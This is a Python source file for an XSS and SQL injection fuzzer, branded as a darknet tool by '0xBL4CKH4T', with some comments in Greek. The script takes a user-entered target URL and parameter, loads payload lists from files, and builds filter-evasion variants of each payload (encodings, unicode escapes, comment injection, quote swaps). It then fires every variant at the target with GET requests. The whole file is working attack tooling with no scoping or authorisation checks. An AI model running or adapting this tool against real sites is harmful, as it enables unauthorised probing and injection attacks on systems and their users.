import requests
from urllib.parse import quote
from rich.console import Console
from rich.progress import track
import itertools

console = Console()

# Φορτώνει τα payloads από αρχεία
def load_payloads(path):
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]

# Bypass μετατροπές για XSS
def xss_bypass_variations(payload):
    variants = []

    # Original
    variants.append(payload)

    # URL encoded
    variants.append(quote(payload))

    # Unicode escaped \u
    unicode_esc = ''.join(['\\u%04x' % ord(c) for c in payload])
    variants.append(unicode_esc)

    # HTML entity encode < and >
    html_entity = payload.replace('<', '&#x3C;').replace('>', '&#x3E;')
    variants.append(html_entity)

    # Replace quotes with unicode equivalents
    variants.append(payload.replace('"', '\u0022').replace("'", '\u0027'))

    return variants

# Bypass μετατροπές για SQLi
def sqli_bypass_variations(payload):
    variants = []

    # Original
    variants.append(payload)

    # Add space/tab variations
    variants.append(payload.replace(' ', '\t'))
    variants.append(payload.replace(' ', '%09'))

    # Comments injected
    if '--' in payload:
        variants.append(payload.replace('--', '-- -'))
        variants.append(payload.replace('--', '/* */--'))
    if '/*' in payload:
        variants.append(payload.replace('/*', '/**/'))

    # Mixed quotes
    variants.append(payload.replace("'", '"'))
    variants.append(payload.replace('"', "'"))

    return variants

# Main fuzzing function
def fuzz_xss(url, param, payloads):
    console.print(f"[bold yellow]Starting XSS fuzzing on {url} parameter '{param}'[/bold yellow]")
    for payload in track(payloads, description="XSS payloads"):
        for variant in xss_bypass_variations(payload):
            try:
                # Στέλνουμε ως GET parameter
                params = {param: variant}
                r = requests.get(url, params=params, timeout=7)
                # Απλά τυπώνουμε response code και μήκος περιεχομένου για now
                console.print(f"[green]Payload:[/green] {variant[:50]}... | Status: {r.status_code} | Length: {len(r.text)}")
            except Exception as e:
                console.print(f"[red]Error:[/red] {e}")

def fuzz_sqli(url, param, payloads):
    console.print(f"[bold yellow]Starting SQLi fuzzing on {url} parameter '{param}'[/bold yellow]")
    for payload in track(payloads, description="SQLi payloads"):
        for variant in sqli_bypass_variations(payload):
            try:
                # Στέλνουμε ως GET parameter
                params = {param: variant}
                r = requests.get(url, params=params, timeout=7)
                console.print(f"[green]Payload:[/green] {variant[:50]}... | Status: {r.status_code} | Length: {len(r.text)}")
            except Exception as e:
                console.print(f"[red]Error:[/red] {e}")

def main():
    console.print("[bold red]\n[ HELLENIC DARKNET FUZZER ][/bold red]")
    console.print("[green]Made by: 0xBL4CKH4T[/green]\n")

    url = input("Enter target URL (http://example.com/page): ").strip()
    param = input("Enter vulnerable parameter name: ").strip()

    console.print("Select fuzzing type:")
    console.print("1) XSS")
    console.print("2) SQL Injection")

    choice = input("Choice: ").strip()

    if choice == "1":
        xss_payloads = load_payloads("payloads/xss.txt")
        fuzz_xss(url, param, xss_payloads)
    elif choice == "2":
        sql_payloads = load_payloads("payloads/sql.txt")
        fuzz_sqli(url, param, sql_payloads)
    else:
        console.print("[red]Invalid choice[/red]")

if __name__ == "__main__":
    main()
